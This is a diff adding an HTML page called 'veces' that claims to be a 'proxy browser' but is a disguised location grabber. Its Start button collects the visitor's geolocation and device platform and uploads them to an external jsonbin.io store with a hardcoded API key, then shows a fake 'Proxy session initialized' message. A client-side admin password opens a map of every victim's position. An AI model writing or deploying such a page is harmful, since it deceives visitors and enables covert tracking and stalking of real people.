@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>veces</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        body { font-family: sans-serif; }
+        #map { height: 350px; width: 100%; border-radius: 12px; margin-top: 15px; border: 1px solid #ddd; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="bg-slate-50 min-h-screen flex flex-col items-center justify-center p-4">
+
+    <div class="text-center mb-8">
+        <h1 class="text-5xl font-bold text-slate-800 tracking-tight">veces</h1>
+        <p class="text-slate-400 mt-2 font-medium">proxy browser</p>
+    </div>
+
+    <div class="w-full max-w-md bg-white p-8 rounded-3xl shadow-2xl border border-slate-100">
+        <div id="status" class="hidden mb-4 p-3 rounded-xl text-center text-sm font-bold"></div>
+        
+        <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-5 rounded-2xl shadow-lg transition-all active:scale-95 text-lg">
+            Start
+        </button>
+
+        <div class="mt-10 border-t border-slate-100 pt-6">
+            <div id="login-section">
+                <input type="password" id="pass" placeholder="Password" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl mb-3 outline-none focus:ring-2 focus:ring-blue-400 transition-all">
+                <button id="admin-btn" class="w-full bg-slate-800 hover:bg-slate-900 text-white py-3 rounded-xl font-bold transition-colors">
+                    Admin Login
+                </button>
+            </div>
+
+            <div id="dashboard" class="hidden">
+                <div class="flex justify-between items-center mb-2">
+                    <h2 class="font-bold text-slate-700">Live Connections</h2>
+                    <button id="logout" class="text-red-500 text-xs font-bold hover:underline">Lock</button>
+                </div>
+                <div id="map"></div>
+                <button id="refresh-map" class="w-full mt-3 text-xs bg-slate-100 py-2 rounded-lg text-slate-600 hover:bg-slate-200 transition-all">
+                    Refresh Data
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // --- CONFIGURATION ---
+        const BIN_ID = "694b70d443b1c97be901f24b"; 
+        const API_KEY = "$2a$10$v/u.3QIsZjp/k/ptGgQwF./CkX29f1nu.f2FYI0qKwcEZX3t3RNRW"; 
+        const ADMIN_PASS = "mommy9";
+
+        const startBtn = document.getElementById('start-btn');
+        const adminBtn = document.getElementById('admin-btn');
+        const passInput = document.getElementById('pass');
+        const statusBox = document.getElementById('status');
+        let map;
+        let markers = [];
+
+        function showStatus(msg, isError = false) {
+            statusBox.innerText = msg;
+            statusBox.className = `mb-4 p-3 rounded-xl text-center text-sm font-bold ${isError ? 'bg-red-100 text-red-700' : 'bg-green-100 text-green-700'}`;
+            statusBox.classList.remove('hidden');
+            setTimeout(() => statusBox.classList.add('hidden'), 5000);
+        }
+
+        startBtn.onclick = () => {
+            startBtn.disabled = true;
+            startBtn.innerText = "Connecting...";
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const newLoc = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    time: new Date().toLocaleString(),
+                    device: navigator.platform
+                };
+
+                try {
+                    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                        headers: { "X-Master-Key": API_KEY }
+                    });
+                    const data = await res.json();
+                    
+                    let records = data.record;
+                    if (!Array.isArray(records)) records = [];
+                    
+                    // Filter out any placeholder data
+                    records = records.filter(r => r.lat);
+                    
+                    records.push(newLoc);
+                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                        method: 'PUT',
+                        headers: {
+                            "Content-Type": "application/json",
+                            "X-Master-Key": API_KEY
+                        },
+                        body: JSON.stringify(records)
+                    });
+
+                    showStatus("Proxy session initialized.");
+                } catch (e) {
+                    showStatus("Cloud Error: Check Keys", true);
+                }
+                startBtn.disabled = false;
+                startBtn.innerText = "Start";
+            }, (err) => {
+                showStatus("Permission Denied", true);
+                startBtn.disabled = false;
+                startBtn.innerText = "Start";
+            });
+        };
+
+        adminBtn.onclick = () => {
+            if(passInput.value === ADMIN_PASS) {
+                document.getElementById('login-section').classList.add('hidden');
+                document.getElementById('dashboard').classList.remove('hidden');
+                initMap();
+                loadData();
+            } else {
+                showStatus("Access Denied", true);
+            }
+        };
+
+        function initMap() {
+            if(!map) {
+                map = L.map('map').setView([20, 0], 2);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            }
+        }
+
+        async function loadData() {
+            try {
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: { "X-Master-Key": API_KEY, "X-Bin-Meta": "false" }
+                });
+                const records = await res.json();
+                markers.forEach(m => map.removeLayer(m));
+                markers = [];
+
+                if (Array.isArray(records)) {
+                    records.filter(r => r.lat).forEach(loc => {
+                        const m = L.marker([loc.lat, loc.lng]).addTo(map);
+                        markers.push(m);
+                    });
+                    if (markers.length > 0) map.fitBounds(new L.featureGroup(markers).getBounds().pad(0.2));
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        document.getElementById('logout').onclick = () => location.reload();
+        document.getElementById('refresh-map').onclick = loadData;
+    </script>
+</body>
+</html>
